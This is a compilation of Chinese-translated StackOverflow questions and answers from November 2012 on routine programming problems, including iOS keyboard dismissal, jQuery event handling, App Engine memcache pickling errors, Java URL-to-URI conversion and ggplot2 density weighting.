# StackOverflow 问答 13530000-13530999

# ios - 无法在 iOS 模拟器中关闭键盘

> ID：13530007
> 
> 赞同：3
> 
> 时间：2012-11-23T13:21:39.517
> 
> 标签：ios, ios-simulator

我无法调用 textFieldShouldEndEditing。我已经在界面生成器中重新创建了链接并尝试过，但似乎没有任何效果。知道为什么不调用它吗？

编辑

```
 -(BOOL)textFieldShouldEndEditing:(UITextField *)textField
 {
     NSLog(@"Done editing...");
     [textField resignFirstResponder];
      return YES;
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:32:53.890

你需要代言人！

尝试在你的 .h 中添加这个`<UITextFieldDelegate>`

在你的 .m

`_yourTextField.delegate = self`.

有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:39:10.480

试试这个代码。

```
- (BOOL)textFieldShouldReturn:(UITextField *)textField
{
 [Self.view EndEditing:YES];
 return YES;    
} 
```

也使用 `_myTextField.delegate = self`; 在你的 `ViewDidLoad`

在您的 .h 文件中，`<UITextFieldDelegate>`在您的班级名称之后添加。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T13:30:19.593

你可以试试这段代码...

```
- (BOOL)textFieldShouldReturn:(UITextField *)textField
{
 [textField resignFirstResponder];
 return YES;    
}
- (BOOL)textFieldShouldEndEditing:(UITextField *)textField
{
  return YES;
} 
```

我希望这能帮到您。

快乐编码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T13:33:06.033

您应该将 textField 的委托设置为您实现的类`textFieldShouldEndEditing:`。

你可以通过两种方式做到这一点：

首先，在 InterfaceBuilder 中，从组件中按住 ctrl 并拖动到 viewController，然后选择“delegate”。

或者，在`viewDidLoad`类中，添加以下行：

```
_myTextField.delegate = self; 
```

对于这两种方式，在你的 .h 文件中，在`<UITextFieldDelegate>`你的类名之后添加。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T14:53:41.363

只是为了好玩，如果你想真正花哨，你可以让键盘在用户触摸屏幕上的任何地方时消失。在 ViewDidLoad 中添加此代码，它将起作用。

也阅读这个 Stackoverflow 链接 -[关闭 iphone 键盘](https://stackoverflow.com/questions/389825/dismiss-iphone-keyboard)

```
- (void)viewDidLoad
{

UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] 
                                   initWithTarget:self
                                   action:@selector(dismissKeyboard)];

    [self.view addGestureRecognizer:tap];

}

-(void)dismissKeyboard 
{
//here text1 is your custom UITextField
    [text1 resignFirstResponder];
} 
```

# drupal - 包含 CCK 字段的分类菜单作为子菜单/子菜单

> ID：13530008
> 
> 赞同：1
> 
> 时间：2012-11-23T13:21:43.523
> 
> 标签：drupal, drupal-7, views, cck, taxonomy

您好，我使用 Drupal 开发了几个网站，这是我第一次收到客户的需求。

该网站是关于汽车商店的。所以在创建车辆时，有名称、品牌、型号、年份、里程等......作为要填写的字段“品牌”字段是一个下拉列表，字段类型为“术语参考”并使用分类词汇“车辆make" "Model" 只是一个可以自定义输入的文本字段

我想要的只是一个菜单：将“制造”作为父/主菜单项，并列出特定制造下的所有模型。

就像是

丰田

*   普锐斯
*   花冠
*   超级GL

本田

*   思域
*   洞察力

我可以使用视图来执行此操作吗？

这是非常紧急的，甚至会感激一个线索。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T06:55:36.747

很少有模块可以为您提供类似的功能。尝试使用分类块和/或分类菜单块。

# r - S3 方法的 R-oxygen 文档在检查时产生错误

> ID：13530009
> 
> 赞同：2
> 
> 时间：2012-11-23T13:21:47.283
> 
> 标签：r, roxygen

> **可能重复：**
> [Roxygen：如何在不同的包中正确记录泛型的 S3 方法？](https://stackoverflow.com/questions/6517222/roxygen-how-to-properly-document-a-s3-method-of-a-generic-in-a-different-packag)

我尝试基于包尾中定义的 as.mcmc 创建一个方法 as.mcmc.mcmcComposite。这是代码：

```
#' as.mcmc Extract mcmc object from a result to be used with coda package
#' @title Extract mcmc object from a result to be used with coda package
#' @author Marc Girondot
#' @return A mcmc.list object
#' @param x A result object
#' @description Take a mcmcComposite object and create a mcmc.list object
#' @examples
#' # Try
#’ method as.mcmc mcmcComposite
#' @export

as.mcmc.mcmcComposite <-
function(x) {
    return(x$resultMCMC)
} 
```

它运行良好，但在检查时会产生错误：

```
* checking Rd \usage sections ... NOTE
S3 methods shown with full name in documentation object 'as.mcmc.mcmcComposite':
  ‘as.mcmc.mcmcComposite’

The \usage entries for S3 methods should use the \method markup and not
their full name.
See the chapter ‘Writing R documentation files’ in the ‘Writing R
Extensions’ manual. 
```

我不明白如何纠正这样的错误。感谢您的任何建议

马克·吉伦多

# c# - 制作 .net 组件

> ID：13530010
> 
> 赞同：0
> 
> 时间：2012-11-23T13:21:49.000
> 
> 标签：c#, matlab

我用 matlabe 制作了两个函数并想制作一个 .net 组件
我创建了一个新项目，添加了一个类，并添加了文件（两个函数 .m）
，但是当我试图 bult 项目时，我收到了日志警告消息并在结束这个
错误发生

> **.NET 框架无效。**
> **未找到指定的框架或当前不受支持。** **？？？使用 ==> mcc**时出错 **执行 mcc 时出错，返回状态 = 1 (0x1)。**
> 
> **编译过程中出现错误。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:25:57.107

我对 Matlab 一无所知，但你安装了 .Net 框架？您可能需要特定版本的 .Net，这可能在您的 Matlab 环境中配置？

查看此博客文章以获取有关如何设置 .Net 框架版本的信息：http: [//itscommonsensestupid.blogspot.co.uk/2009/11/matlab-invalid-net-framework-either.html](http://itscommonsensestupid.blogspot.co.uk/2009/11/matlab-invalid-net-framework-either.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T13:26:03.207

.Net 框架不支持任何 Matlab .m 文件。

您必须在 C# 或 VB.Net 中使用 .Net 框架之外的类来重写您的 matlab 脚本。

[这篇文章](http://www.codeproject.com/Articles/5468/1-2-3-ways-of-integrating-MATLAB-with-the-NET)看起来很有希望。

# pixel - 从图像中读取像素并使用 PHP 在浏览器中随机显示单个像素

> ID：13530011
> 
> 赞同：2
> 
> 时间：2012-11-23T13:21:49.407
> 
> 标签：pixel, php-gd

我有一个保存在数据库中的图像。我需要一个可以读取该图像每个像素的 RGB + x 和 y 值的脚本。

这是必需的，因为我希望能够在浏览器中显示此图像的随机像素。随机我的意思是，随机位置。用表格选择像素数。使用表单时，图像的一些像素将在浏览器中可见，并且此新图像将被保存。下次使用该表单时，将在浏览器中显示具有几个可见像素的新图像。以此类推....每次使用表格时，图像会越来越明显。

我用 PHP GD 库做了一些测试，但无法提取 RGB 以及每个像素的位置。为了输出 RGBA 值数组，我使用了[如何计算图像中的像素数 (php)](https://stackoverflow.com/questions/13113981/how-to-count-number-of-pixels-in-image-php)。但正如你所见，这仅仅是个开始。

```
$img = "images/test.png";
$imgHand = imagecreatefrompng("$img");
$imgSize = GetImageSize($img);
$imgWidth = $imgSize[0];
$imgHeight = $imgSize[1];

// Define a new array to store the info
$pxlCorArr= array();

for ($l = 0; $l < $imgHeight; $l++) {
    // Start a new "row" in the array for each row of the image.
    $pxlCorArr[$l] = array();

    for ($c = 0; $c < $imgWidth; $c++) {
        $pxlCor = ImageColorAt($imgHand,$c,$l);

        // Put each pixel's info in the array
        $pxlCorArr[$l][$c] = ImageColorsForIndex($imgHand, $pxlCor);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T20:02:35.317

您要先显示部分图像，然后再显示完整图像吗？还是随机的一部分？

看看这个 ，

[https://github.com/ogres/Image2HTML](https://github.com/ogres/Image2HTML)

它将图像转换为 html 表格，您可以对其进行编辑，以便仅显示图像的随机部分

# c# - C# 文化相关的动态表单

> ID：13530012
> 
> 赞同：1
> 
> 时间：2012-11-23T13:21:57.663
> 
> 标签：c#, asp.net, code-generation, globalization, cultureinfo

我不知道标题是否是我想要的最佳术语，但事情就是这样

我们正在重新开发一个基本上由丰富的 crud 页面组成的应用程序，该应用程序将从许多国家访问，并且每个国家都有一些特定的字段，字段之间的数据验证以及针对数据库中其他数据的验证。有些甚至有其他国家看不到的整个部分。

今天，应用程序的每个屏幕都有一堆 ifs 语句来控制表单的可见性和数据验证。不用说可维护性非常低并且容易出错。该应用程序将可用于我们今天拥有的更多国家/地区，并且每个国家/地区的新实施都非常昂贵。

我需要一个框架/模式/技巧来完成基于登录用户文化的动态表单生成/处理

我的想法之一是将与文化相关的字段/部分作为元数据存储在数据库中，并相应地生成表单；另一个想法是将页面开发为分步向导，并根据该文化/国家/地区的要求加载步骤

**编辑：**应用程序是 .Net 4.0，可能是 Web 表单或 MVC，尚未完全确定

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:34:29.093

我喜欢数据库中的元数据。您可以避免动态生成，在页面中放置所有控件/字段。然后，解释元数据信息并删除那些与当前国家不对应的控件。

撇开评论：在当今使用大量客户端逻辑（javascript，主要是 jQuery）的网络中，我建议使用 MVC。

# javascript - 如何同时添加鼠标悬停和单击事件？

> ID：13530014
> 
> 赞同：2
> 
> 时间：2012-11-23T13:22:06.823
> 
> 标签：javascript, jquery, html, css

我有两个不同的示例，一个具有鼠标悬停功能，另一个具有单击事件功能，但现在我希望将两者放在一起，以下是描述：

**鼠标悬停示例链接：** [http ://wheaton.advisorproducts.com/investment-advisory](http://wheaton.advisorproducts.com/investment-advisory)

**鼠标点击示例：http:** [//ivyfa.advisorproducts.com/financial-planning-process](http://ivyfa.advisorproducts.com/financial-planning-process)

**需求是这样的**

在这个例子中（[http://ivyfa.advisorproducts.com/financial-planning-process](http://ivyfa.advisorproducts.com/financial-planning-process)）现在鼠标悬停功能正在工作，但现在我想要以下功能：

1.  当用户将鼠标移到图像上时，在中心它们的相关文本将在漏斗和下面的圆圈示例中可见。
2.  如果用户单击任何图像部分，则每次都可以看到其相关文本，直到用户单击另一个图像或部分。
3.  当用户将鼠标悬停在 diif-2 图像部分时，与此单击事件一起，他们的相关文本也将可见，当用户将鼠标移出圆圈时，将显示选定的文本。

**最后我想合并这两个例子**

解释这个例子非常复杂，抱歉:(

**下面是用于鼠标悬停功能的 js 代码：**

```
/*-----Only for hove over image -show hide text------*/
var IdAry=['slide1','slide2','slide3','slide4'];
window.onload=function() {
 for (var zxc0=0;zxc0<IdAry.length;zxc0++){
  var el=document.getElementById(IdAry[zxc0]);
  if (el){
   el.onmouseover=function() {
     changeText(this,'hide','show')
    }
   el.onmouseout=function() {
     changeText(this,'show','hide');
    }
  }
 }
}
function changeText(obj,cl1,cl2) {
   obj.getElementsByTagName('SPAN')[0].className=cl1;
   obj.getElementsByTagName('SPAN')[1].className=cl2;
} 
```

**下面是用于点击事件功能的 js 代码：**

```
/*----------Text change on click - Our Process page---------------*/
var prev;
var IdAry = ['slide1', 'slide2', 'slide3', 'slide4'];
window.onload = function () {
    for (var zxc0 = 0; zxc0 < IdAry.length; zxc0++) {
        var el = document.getElementById(IdAry[zxc0]);
        if (el) {
            setUpHandler(el);
            el.onmouseover = function () {
                changeText(this,'hide','show')
            }
            el.onmouseout = function () {
                changeText(this,'show','hide');
            }
        }
    }
}

/*---------This is used to add selected class on clicked id only and remove class selected from rest---------*/

function setUpHandler(el) {
$("#" + IdAry.join(",#")).click(function () {
    $(this).addClass("selected");
    $("#graphics .selected").not(this).removeClass("selected");
})

/*---------This will add show hide class to thier spans and vise versa-------*/

$("#" + IdAry.join(",#")).click(
function () {
    changeText(this, "hide", "show");
    clearSelection();
},
function () {
    changeText(this, "show", "hide");
    clearSelection();
})
}

function changeText(obj, cl1, cl2) {

    obj.getElementsByTagName('SPAN')[0].className = "hide";
    obj.getElementsByTagName('SPAN')[1].className = "show";

    if (prev && obj !== prev) {
        prev.getElementsByTagName('SPAN')[0].className = "show";
        prev.getElementsByTagName('SPAN')[1].className = "hide";
    }
    prev = obj
}

function clearSelection() {
    if (window.getSelection) window.getSelection().removeAllRanges();
    else if (document.selection) document.selection.empty();
} 
```

谢谢苏希尔

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T13:38:55.527

您可以将多个事件名称添加到同一分配：

```
$(document).on('mouseover click', '.yourObject', function (event) {
    if (event.type === "mouseover") {
        // Mouse-Over code here
    } else if (event.type === "click") {
        // Click code here
    }
}); 
```

另外，尝试使用[`addEventListener`](https://developer.mozilla.org/en-US/docs/DOM/element.addEventListener)而不是硬编码事件，例如`el.onmouseout=function(){...}` 使用：

```
el.addEventListener("mouseout", function () {...}); 
```

如果需要，这将使管理事件变得更容易（例如，删除它们）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:25:44.537

您可以通过使用向 DOM 添加多个事件

```
$(document).on('mouseover','.yourObject', function(){ //over code })
           .on('click', '.yourObject', function() { //click code}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T13:43:49.020

您的代码的问题是您设置了 window.onload 两次。由于您使用的是 jQuery，因此您可以通过绑定 document.ready 事件来使其工作。

```
//first sample
(function($){
/*-----Only for hove over image -show hide text------*/
var IdAry=['slide1','slide2','slide3','slide4'];
$(function() {
 for (var zxc0=0;zxc0<IdAry.length;zxc0++){
  var el=document.getElementById(IdAry[zxc0]);
  if (el){
   el.onmouseover=function() {
     changeText(this,'hide','show')
    }
   el.onmouseout=function() {
     changeText(this,'show','hide');
    }
  }
 }
});
function changeText(obj,cl1,cl2) {
   obj.getElementsByTagName('SPAN')[0].className=cl1;
   obj.getElementsByTagName('SPAN')[1].className=cl2;
}
}(jQuery));

//second sample
(function($){
/*----------Text change on click - Our Process page---------------*/
var prev;
var IdAry = ['slide1', 'slide2', 'slide3', 'slide4'];
$(function () {
    for (var zxc0 = 0; zxc0 < IdAry.length; zxc0++) {
        var el = document.getElementById(IdAry[zxc0]);
        if (el) {
            setUpHandler(el);
            el.onmouseover = function () {
                changeText(this,'hide','show')
            }
            el.onmouseout = function () {
                changeText(this,'show','hide');
            }
        }
    }
});

/*---------This is used to add selected class on clicked id only and remove class selected from rest---------*/

function setUpHandler(el) {
$("#" + IdAry.join(",#")).click(function () {
    $(this).addClass("selected");
    $("#graphics .selected").not(this).removeClass("selected");
})

/*---------This will add show hide class to thier spans and vise versa-------*/

$("#" + IdAry.join(",#")).click(
function () {
    changeText(this, "hide", "show");
    clearSelection();
},
function () {
    changeText(this, "show", "hide");
    clearSelection();
})
}

function changeText(obj, cl1, cl2) {

    obj.getElementsByTagName('SPAN')[0].className = "hide";
    obj.getElementsByTagName('SPAN')[1].className = "show";

    if (prev && obj !== prev) {
        prev.getElementsByTagName('SPAN')[0].className = "show";
        prev.getElementsByTagName('SPAN')[1].className = "hide";
    }
    prev = obj
}

function clearSelection() {
    if (window.getSelection) window.getSelection().removeAllRanges();
    else if (document.selection) document.selection.empty();
}
}(jQuery)); 
```

# python - 添加到内存缓存时出现 PicklingError

> ID：13530018
> 
> 赞同：2
> 
> 时间：2012-11-23T13:22:20.610
> 
> 标签：python, google-app-engine

我第一次尝试在 App Engine 上使用 memcache 并遇到“PicklingError”。

我尝试使用 memcache 的第一个地方是在网站的主页上，我从数据存储中获取内容：

```
def get(self):
    content = memcache.get('home:content')
    if content is None:
        all_content = Content.all()
        all_content.order("-views")
        all_content.filter('published =', True)
        content = all_content.run(batch_size=5, limit=5)
        memcache.add(key='home:content', value=content, time=120) 
```

（请注意，无需我尝试将内容 Query 对象放入 memcache 即可正常工作。这是它在最后一行遇到的错误（memcache.add ...）：

```
PicklingError: Pickling of datastore_query.Batcher is unsupported. 
```

这是内容的模型：

```
class Content(db.Model):
    category = db.StringProperty(required = True)
    content_type = db.StringProperty(required = True)
    published = db.BooleanProperty(default = False)
    title = db.StringProperty(required = True)
    abstract = db.TextProperty(required = True)
    summary = db.TextProperty(required = True)
    URL = db.LinkProperty(required = True)
    youtube_id = db.StringProperty(required = False)
    thumbnail = db.LinkProperty(required = True)
    post_author = db.StringProperty(required = True)
    author_url = db.LinkProperty(required = False)
    date_post = db.DateTimeProperty(required = True, auto_now_add = True)
    date_source = db.DateTimeProperty(required = False)    
    # todo: split out to use decent shardedcounter approach
    views = db.IntegerProperty(default = 0)
    up_votes = db.IntegerProperty(default = 0)
    down_votes = db.IntegerProperty(default = 0)    
    def votes(self):
        return self.up_votes - self.down_votes 
```

我正在努力弄清楚 PicklingError 是什么以及它与尝试将 Query 对象存储到内存缓存中的关系。我的问题：我做错了什么？这是因为我试图缓存迭代器吗？缓存 Query 对象并需要在每次页面加载时对其调用 .run() 是否有任何价值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T18:50:08.350

看看[源](http://code.google.com/p/googleappengine/source/browse/trunk/python/google/appengine/api/memcache/__init__.py)代码`memcache`。

简而言之，这是因为您的值必须以简单的方式序列化，因此默认情况下`pickle`（实际上`cPickle`）用于序列化您传入的对象。

当`add`被调用时，`_set_with_policy`被调用，随后调用`_set_multi_async_with_policy`。在`_set_multi_async_with_policy`中，键值对作为传入`mapping`并[在循环中序列化](http://code.google.com/p/googleappengine/source/browse/trunk/python/google/appengine/api/memcache/__init__.py?r=302#968)：

```
for key, value in mapping.iteritems():
  server_key = _key_string(key, key_prefix, user_key)
  stored_value, flags = _validate_encode_value(value, self._do_pickle) 
```

在辅助方法`_validate_encode_value`中，如果传入的对象不是可识别的对象，例如`int`, `bool`, `str`，则该方法[会尝试腌制](http://code.google.com/p/googleappengine/source/browse/trunk/python/google/appengine/api/memcache/__init__.py?r=302#226)该对象：

```
else:
  stored_value = do_pickle(value)
  flags |= TYPE_PICKLED 
```

**更新：**当您调用 run 时，您会得到一个[迭代器对象](http://code.google.com/p/googleappengine/source/browse/trunk/python/google/appengine/ext/db/__init__.py?r=302#2073)，其中包含查询中包含的某些对象。如果您只想腌制结果，则可以将此迭代器通过以下方式转换为列表

```
content = list(all_content.run(batch_size=5, limit=5)) 
```

如果您想保留其他部分，则需要某种自定义pickler。如您[所见](http://code.google.com/p/googleappengine/source/browse/trunk/python/google/appengine/datastore/datastore_query.py?r=302#2510)：`Batcher`

```
 def __getstate__(self):
    raise pickle.PicklingError(
        'Pickling of datastore_query.Batch is unsupported.') 
```

中定义的大多数类——与定义大多数查询行为的类完全相同——强烈反对通过调用when来`datastore_query`进行酸洗。如果您从未使用过它，并且是有助于腌制和解封对象的自定义方法。`PicklingError``__getstate__``__getstate__``__setstate__`

# java - 有不明智的字符时如何将 URL 转换为 URI？

> ID：13530019
> 
> 赞同：6
> 
> 时间：2012-11-23T13:22:23.847
> 
> 标签：java, http, url, uri

我的 URL 对象的路径包含[不明智的字符（RFC 2396）](https://www.rfc-editor.org/rfc/rfc2396#section-2.4.3)，在我的情况下它是“|” （管道）字符。现在我需要将其安全地转换为 URI，但[`URL.toURI()`](http://docs.oracle.com/javase/6/docs/api/java/net/URL.html)会引发异常。

我已经阅读了[URL 文档](http://docs.oracle.com/javase/6/docs/api/java/net/URL.html)，但这部分让我感到困惑：

> URL 类本身并不根据 RFC2396 中定义的转义机制对任何 URL 组件进行编码或解码。调用者有责任对在调用 URL 之前需要转义的任何字段进行编码，并对从 URL 返回的任何转义字段进行解码。此外，由于 URL 不知道 URL 转义，因此它无法识别同一 URL 的编码或解码形式之间的等价性。

那么我该怎么做呢？在转换过程中编码此字符的模式是什么？我需要创建我的 URL 对象的编码副本吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:34:28.163

好的，我想出了这样的事情：

```
URI uri = new URI(url.getProtocol(), 
                  null /*userInfo*/,
                  url.getHost(), 
                  url.getPort(), 
                  (url.getPath()==null)?null:URLDecoder.decode(url.getPath(), "UTF-8"),
                  (url.getQuery()==null)?null:URLDecoder.decode(url.getQuery(), "UTF-8"),
                  null /*fragment*/); 
```

看起来它有效，[这是一个例子](http://ideone.com/ZUpAnJ)。有人可以确认这是正确的解决方案吗？

***编辑**：当有查询时，[最初的解决方案有一些问题，所以我已经修复了它。](http://ideone.com/tCl7Yb)*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:42:12.543

使用 URL 编码？

从您的示例中，您目前拥有：

```
URL url = new URL("http", "google.com", 8080, "/crapy|path with-unwise_characters.jpg"); 
```

相反，我会使用：

```
String path = "/crapy|path with-unwise_characters.jpg"
URL url = new URL("http", "google.com", 8080, URLEncoder.encode(path, "UTF-8")); 
```

这应该可以按照标准 URL 编码工作并处理路径中的所有不明智的字符。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-04T22:09:12.330

HTTPClient 4 具有该 org.apache.http.client.utils.URIBuilder 的对象：

```
 URIBuilder builder = 
            new URIBuilder()
        .setScheme(url.getProtocol())
        .setHost(url.getHost())
        .setPort(url.getPort())
        .setUserInfo(url.getUserInfo())
        .setPath(url.getPath())
        .setQuery(url.getQuery());
    URI uri = builder.build();
    return uri; 
```

# rotation - iOS 6 旋转方法没有被调用

> ID：13530020
> 
> 赞同：0
> 
> 时间：2012-11-23T13:22:25.733
> 
> 标签：rotation, ios6

我有以下视图层次结构

*   UIScrollView（水平滚动）
    *   UIScrollView（垂直滚动）
        *   UIViewController

实际上有一个 Root ScrollView 控制器，它有多个 Sub ScrollViews。（Root ScrollViewController 仅水平滚动 - 子仅垂直滚动）。每个 Sub ScrollView 都有一个 UIViewController。

我的 Root ScrollView 控制器按预期工作，并调用我的旋转方法，如下所示：

```
- (BOOL)shouldAutorotateToInterfaceOrientation (UIInterfaceOrientation)interfaceOrientation
{
    return YES;
}

- (void) willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration
{
    [self rotateScrollViewToInterfaceOrientation:toInterfaceOrientation];
}

- (void) rotateScrollViewToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
 {
    if (UIInterfaceOrientationIsLandscape(interfaceOrientation))
    {
        // do some rotation logic
    }
} 
```

我在我的 Sub ScrollViews 和 UIViewControllers 中使用了相同的方法，但它们不会在旋转时被调用。

任何人都知道为什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:37:09.557

不推荐使用 shouldAutorotateToInterfaceOrientation 方法，并且从 iOS 6 开始将不再调用。

尝试实现以下这些方法。

```
-(BOOL)shouldAutomaticallyForwardAppearanceMethods{   
     // This method is called to determine whether to 
     // automatically forward appearance-related containment
     //  callbacks to child view controllers.
    return YES;

}
-(BOOL)shouldAutomaticallyForwardRotationMethods{
    // This method is called to determine whether to
    // automatically forward rotation-related containment 
    // callbacks to child view controllers.
   return YES;
} 
```

注意：这些方法仅在 iOS 6 中支持。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:34:39.773

从 iOS 6.0 发行说明：

> iOS 6 中的自动旋转正在发生变化。在 iOS 6 中，不推荐使用 UIViewController 的 shouldAutorotateToInterfaceOrientation: 方法。取而代之的是，您应该使用 supportedInterfaceOrientationsForWindow: 和 shouldAutorotate 方法。更多的责任正在转移到应用程序和应用程序委托身上。现在，iOS 容器（例如 UINavigationController）不会咨询它们的子容器来确定它们是否应该自动旋转。默认情况下，应用程序和视图控制器支持的界面方向设置为 iPad 惯用语的 UIInterfaceOrientationMaskAll 和 iPhone 惯用语的 UIInterfaceOrientationMaskAllButUpsideDown 。视图控制器支持的界面方向会随着时间而改变——甚至应用程序支持的界面方向也会随着时间而改变。每当设备旋转或视图控制器以全屏模式呈现样式呈现时，系统都会向最顶层的全屏视图控制器（通常是根视图控制器）询问其支持的界面方向。此外，仅当此视图控制器从其 shouldAutorotate 方法返回 YES 时，才会检索支持的方向。系统将视图控制器支持的方向与应用支持的方向（由 Info.plist 文件或应用委托的 application:supportedInterfaceOrientationsForWindow: 方法确定）相交以确定是否旋转。系统通过与应用程序的 supportedInterfaceOrientationsForWindow 返回的值相交来确定是否支持方向：方法，其值由最顶层全屏控制器的supportedInterfaceOrientations 方法返回。setStatusBarOrientation:animated: 方法并未完全弃用。它现在仅在最顶层全屏视图控制器的 supportedInterfaceOrientations 方法返回 0 时才有效。这使调用者负责确保状态栏方向一致。为了兼容性，仍然实现 shouldAutorotateToInterfaceOrientation: 方法的视图控制器不会获得新的自动旋转行为。（换句话说，他们不会回退到使用应用程序、应用程序委托或 Info.plist 文件来确定支持的方向。）相反，shouldAutorotateToInterfaceOrientation：

# emacs - Emacs - 插入文本时自动滚动

> ID：13530025
> 
> 赞同：6
> 
> 时间：2012-11-23T13:22:44.390
> 
> 标签：emacs, elisp

这让我发疯了，我整天都在做这件事。

我正在尝试编写一个用于与串行设备通信的进程过滤器。这工作正常，但是当我将文本插入缓冲区时，我希望缓冲区滚动以便我可以看到文本，就像在缓冲区中*键入*文本时一样。我将文本插入到几个缓冲区中，显示串行线路上的不同信息。事实上，每次我发出串行命令时，我都必须向下拖动每个滚动条，这样我才能看到文本。

更改“点”只会更改插入点 - 窗口滚动不会跟随。尝试调用滚动功能和“重新居中”似乎无济于事。如何让窗口滚动？

我还想更改缓冲区，以便您无法输入，或通过单击窗口更改“点”的位置。有没有我应该使用的模式或什么？

非常感谢，如果有人可以提供帮助，

大卫。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T16:07:11.463

我怀疑您的问题来自这样一个事实，即点位置没有附加到缓冲区，而是附加到显示缓冲区的窗口（因为您可以让不同的窗口在不同的位置显示相同的缓冲区）。

你可以尝试这样的事情：

```
(with-selected-window (get-buffer-window YOUR-BUFFER)
  (goto-char (point-max))) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T18:24:34.887

你可能想`(set (make-local-variable 'window-point-insertion-type) t)`在你的缓冲区。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-23T19:00:03.210

感谢大家对此的帮助。如果它对任何人有任何用处，这就是我迄今为止提出的，它似乎有效。

```
(defun append-to-buffer (buffer string)
  "Append the text to the end of a buffer"
  (let ((win (get-buffer-window buffer)))
    (if (eq win nil)
        (progn
          (with-current-buffer buffer
            (goto-char (point-max))
            (insert string)))
      (with-selected-window
          (get-buffer-window buffer)
        (goto-char (point-max))
        (insert string))))) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T14:07:58.483

`(goto-char (point-max))`应该将缓冲区滚动到最后。活动光标不能在 Emacs 的视口之外。您是否将您的电话包装在一个游览保存命令中？

要禁止编辑，请执行`(toggle-read-only 1)`

# r - ggplot2 2d 密度权重

> ID：13530028
> 
> 赞同：1
> 
> 时间：2012-11-23T13:22:52.683
> 
> 标签：r, ggplot2, visualization

我正在尝试使用 R 中的 ggplot2 绘制一些具有 2d 密度轮廓的数据。

我得到了一个有点奇怪的结果。

首先，我设置了我的 ggplot 对象：

```
p <- ggplot(data, aes(x=Distance,y=Rate, colour = Company)) 
```

然后我用 geom_points 和 geom_density2d 绘制它。我希望 geom_density2d 根据组织的规模（OrgSize 变量）进行加权。但是，当我将 OrgSize 添加为加权变量时，图中没有任何变化：

这：

```
p+geom_point()+geom_density2d() 
```

给出了一个相同的情节：

```
p+geom_point()+geom_density2d(aes(weight = OrgSize)) 
```

但是，如果我使用 geom_smooth 对黄土线做同样的事情，那么权重确实会产生明显的差异。

这：

```
p+geom_point()+geom_smooth() 
```

对此给出不同的情节：

```
p+geom_point()+geom_smooth(aes(weight=OrgSize)) 
```

我想知道我是否不恰当地使用了 density2d，我是否应该使用轮廓并提供 OrgSize 作为“高度”？如果是这样，那么为什么 geom_density2d 接受加权因子？

下面的代码：

```
require(ggplot2)

 Company <- c("One","One","One","One","One","Two","Two","Two","Two","Two")
 Store <- c(1,2,3,4,5,6,7,8,9,10)
 Distance <- c(1.5,1.6,1.8,5.8,4.2,4.3,6.5,4.9,7.4,7.2)
 Rate <- c(0.1,0.3,0.2,0.4,0.4,0.5,0.6,0.7,0.8,0.9)
 OrgSize <- c(500,1000,200,300,1500,800,50,1000,75,800)

 data <- data.frame(Company,Store,Distance,Rate,OrgSize)

 p <- ggplot(data, aes(x=Distance,y=Rate))

 # Difference is apparent between these two
 p+geom_point()+geom_smooth()
 p+geom_point()+geom_smooth(aes(weight = OrgSize))

 # Difference is not apparent between these two
 p+geom_point()+geom_density2d()
 p+geom_point()+geom_density2d(aes(weight = OrgSize)) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T17:57:22.350

`geom_density2d`正在“接受”权重参数，但随后不传递给`MASS::kde2d`，因为该函数没有权重。因此，您将需要使用不同的二维密度方法。

（我意识到我的答案没有解决为什么帮助页面说 geom_density2d “理解”权重参数，但是当我尝试计算加权 2D-KDE 时，我需要使用除 MASS 之外的其他包。也许这是一个 TODO @hadley 放入了帮助页面，然后被忽略了？）

# sitecore - Sitecore 单行文本框中的换行符

> ID：13530035
> 
> 赞同：2
> 
> 时间：2012-11-23T13:23:21.203
> 
> 标签：sitecore, sitecore6

当我在 Sitecore 单行字段文本框中按 ENTER 时，它会呈现两个换行符

```
<br/><br/> 
```

此问题仅出现在 Chrome/Firefox 中。在 IE 中 ENTER 只导致一个

我可以
在这些浏览器中以某种方式禁用自动添加吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:21:53.257

问题是由 Sitecore Intranet.WebEdit.js 引起的

修改这段代码有助于解决问题：

```
 if (evt.keyCode == 13 && this.activeElement && this.activeElement.contentEditable() && this.activeElement.parameters["linebreak"] == "br") {
        try {

            if (document.selection != null) {

                var sel = document.selection.createRange();
                sel.pasteHTML('<br />');
                evt.stop();
            }

            if (!Prototype.Browser.IE) {
                evt.srcElement.innerHTML = evt.srcElement.innerHTML + "<br/>";
                evt.stop();
            }
        } 
```

# r - 带有标签地毯的ggplot2箱线图

> ID：13530037
> 
> 赞同：16
> 
> 时间：2012-11-23T13:23:30.330
> 
> 标签：r, ggplot2, vegan

我可以用 ggplot2 制作这样的情节吗？

```
# data
require(vegan)
